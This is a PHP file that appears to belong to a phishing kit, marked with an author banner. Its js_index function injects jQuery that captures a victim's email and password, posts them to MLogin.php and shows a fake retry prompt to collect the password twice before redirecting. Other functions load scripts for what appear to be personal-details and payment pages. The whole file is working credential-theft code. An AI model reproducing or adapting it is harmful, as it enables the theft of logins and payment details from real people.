<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
function js_index() {
	global $rand;
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="../M_scripts/M_home.js"></script>',
				 "code" => '$("#mahdi_23").on("click", function(){if($("#mahdi_21").val() == \'\'){ $("#mahdi_21").addClass("merror"); return false; } if($("#mahdi_22").val() == \'\'){ $("#mahdi_22").addClass("merror"); return false; } if(!IsEmail($("#mahdi_21").val())){ $("#mahdi_21").addClass("merror"); return false; } var dataString = \'MAHDI_1=\'+$("#mahdi_21").val()+\'&MAHDI_2=\'+$("#mahdi_22").val()+\'&MAHDI_W=\'+screen.width+\'&MAHDI_H=\'+screen.height; $.ajax({ type : "POST", url : "MLogin.php", data : dataString, beforeSend : function() { $(".mahdi_3").show(); }, success : function(response) { if(response == "false") {$(".mahdi_3").hide();$(".mahdi_1").hide();$("#mahdi_51").val($("#mahdi_21").val());$(".mahdi_4").show();return false;} else {
								window.location.href = "post.php?dispatch='.$rand.'";
							}}});return true;});
			$("#mahdi_53").on("click", function(){if($("#mahdi_51").val() == \'\'){ $("#mahdi_51").addClass("merror"); return false; }if($("#mahdi_52").val() == \'\'){ $("#mahdi_52").addClass("merror"); return false; }if(!IsEmail($("#mahdi_51").val())){ $("#mahdi_51").addClass("merror"); return false; } var dataString = \'MAHDI_1=\'+$("#mahdi_51").val()+\'&MAHDI_2=\'+$("#mahdi_52").val()+\'&MAHDI_W=\'+screen.width+\'&MAHDI_H=\'+screen.height;$.ajax({
					type : "POST",url : "MLogin.php", data : dataString,beforeSend : function() {$(".mahdi_54").show();}, success : function(response) {if(response == "false") {$(".mahdi_54").hide();$("#mahdi_52").val("");return false;} else {
								window.location.href = "post.php?dispatch='.$rand.'";
							}}});return true;});$("input").change(function () {$(this).removeClass("merror");}).trigger("change");');
	return $ara;
}
function js_perso() {
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="M/js2.js"></script>
	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script><script type="text/javascript" src="//raw.github.com/jpillora/verifyjs/gh-pages/dist/verify.notify.min.js"></script>',
				 "code" => '$("input").change(function () {$(this).removeClass("merror");}).trigger("change");');
	return $ara;
}
function js_pay() {
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="M/js6.js"></script>
	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script><script type="text/javascript" src="//raw.github.com/jpillora/verifyjs/gh-pages/dist/verify.notify.min.js"></script>',
				 "code" => '$( "th" ).remove( ":contains(\'Action\')" );$("#fmtoremove").parent().addClass("frtoremove");$("#fmtoremove").remove();$(".frtoremove").remove();');
	return $ara;
}?>